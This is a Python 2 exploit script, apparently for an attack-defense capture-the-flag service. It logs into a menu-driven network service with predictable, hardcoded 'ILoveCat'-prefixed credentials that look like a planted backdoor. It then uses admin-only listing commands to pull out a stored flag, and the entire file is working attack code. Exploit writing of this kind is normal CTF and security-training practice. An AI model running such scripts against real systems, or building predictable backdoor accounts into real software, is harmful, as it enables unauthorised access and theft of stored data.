# exploit example

class Exploit():

    DEBUG = False

    def recv_until_colon(self, s):
        ret = ""
        while True:
            data = s.recv(1)
            if len(data) == 0:
                raise Exception("Socket is broken. socket.recv() returns empty string.")
            ret += data
            if ret[len(ret) - 1 : ] == ':':
                break
        return ret

    def recv_until_linebreak(self, s):
        ret = ""
        while True:
            data = s.recv(1)
            if len(data) == 0:
                raise Exception("Socket is broken. socket.recv() returns empty string.")
            ret += data
            if ret[len(ret) - 1 : ] == '\n':
                break
        return ret

    def recv_until_main_menu(self, s):
        ret = ""
        while True:
            data = s.recv(1)
            if len(data) == 0:
                raise Exception("Socket is broken. socket.recv() returns empty string.")
            ret += data
            if ret[len(ret) - 10 : ] == ' ========\n':
                break
        return ret

    # We generate a username according to current flag_id.
    def gen_username(self, flag_id):
        LEGITIMATE_USERNAME = ["test00003","test00002","test00004","test00005","test00006","test00007","test00008","test00009"]
        import md5
        m = md5.new()
        m.update(flag_id)
        index = int(m.hexdigest(), 16) % len(LEGITIMATE_USERNAME)
        return LEGITIMATE_USERNAME[index]

    # The password is generated according to current username 
    def gen_password(self, username):
        LEGITIMATE_PASSWORD = ["delluser","applephone","nameitba","aaaaaaaa","12345678", "00001111"]
        import md5
        m = md5.new()
        m.update(username)
        index = int(m.hexdigest(), 16) % len(LEGITIMATE_PASSWORD)
        return "ILoveCat" + LEGITIMATE_PASSWORD[index]

    def client_register(self, s, username, password):
        if self.DEBUG: print "client_register(%s, %s)" % (username, password)
        self.recv_until_colon(s)
        s.send("1\n") # Register
        self.recv_until_colon(s)
        s.send(username + "\n") # Username
        self.recv_until_colon(s)
        s.send(password + "\n") # Password
        self.recv_until_colon(s)
        s.send(password + "\n") # Repeat password
        data = self.recv_until_linebreak(s)
        if self.DEBUG: print data
        if data.find("succeeded") != -1:
            # Registration succeeded
            return True
        else:
            # Registration failed, either duplicated name, or it just doesn't work
            return False
    
    def client_login(self, s, username, password):
        if self.DEBUG: print "client_login(%s, %s)" % (username, password)
        self.recv_until_colon(s)
        s.send("2\n") # Login
        self.recv_until_colon(s)
        s.send(username + "\n") # Username
        self.recv_until_colon(s)
        s.send(password + "\n") # Password
        data = self.recv_until_linebreak(s)
        if self.DEBUG: print data
        if data.find("Successfully") != -1:
            # Logged-in successfully
            return True
        else:
            return False

    def client_admin_list_spot(self, s, spot_name):
        if self.DEBUG: print "client_admin_list_spot(%s)" % (spot_name)
        self.recv_until_colon(s)
        s.send("2\n") # List spots (admin)
        self.recv_until_colon(s)
        s.send(spot_name + "\n")
        data = self.recv_until_main_menu(s)
        if self.DEBUG: print data
        import re
        p = re.compile(r'Name: (\S*)\nCountry/Area: ([\S ]*)\nDrillers: (\d+) in total\n\[(\S+)\]')
        tuples = p.findall(data)
        driller_name = ""
        if len(tuples) > 0:
            driller_name = tuples[0][3]
        return driller_name

    def client_admin_list_driller(self, s, driller_name):
        if self.DEBUG: print "client_list_driller(%s)" % (driller_name)
        self.recv_until_colon(s)
        s.send("3\n") # List drillers (admin)
        self.recv_until_colon(s)
        s.send(driller_name + "\n")
        data = self.recv_until_main_menu(s)
        if self.DEBUG: print data
        import re
        p = re.compile(r'Name: (\S*)\nLocation: ([\S ]*)\n')
        tuples = p.findall(data)
        flag = ""
        if len(tuples) > 0:
            flag = tuples[0][1]
        return flag

    def do_exploit(self, s, flag_id):
        if self.DEBUG: print 'Exploiting..'
        # Username is decided by flag_id
        username = self.gen_username(flag_id)
        # Password is decided by username :)
        password = self.gen_password(username)
        # Skip the first colon after "Statistics"
        self.recv_until_colon(s)
        # Try to register
        ret = self.client_register(s, username, password)
        # Try to login
        ret = self.client_login(s, username, password)
        if not ret:
            if self.DEBUG: print "Login failed. Is service down?"
            # Service is down?
            return
        # List the spots
        driller_name = self.client_admin_list_spot(s, flag_id)
        # List that driller
        flag = self.client_admin_list_driller(s, driller_name)
        return flag

    def execute(self, ip, port, flag_id):

        from socket import socket

        flag = ''
        error = 0
        error_msg = ''
        try:
            s = socket()
            s.connect((ip, port))
            flag = self.do_exploit(s, flag_id)
        except Exception as e:
            error = 42
            error_msg = str(e)

        self.flag = flag
        self.error = error
        self.error_msg = error_msg

    def result(self):
        return {'FLAG' : self.flag,
                'ERROR' : self.error,
                'ERROR_MSG' : self.error_msg,
               }
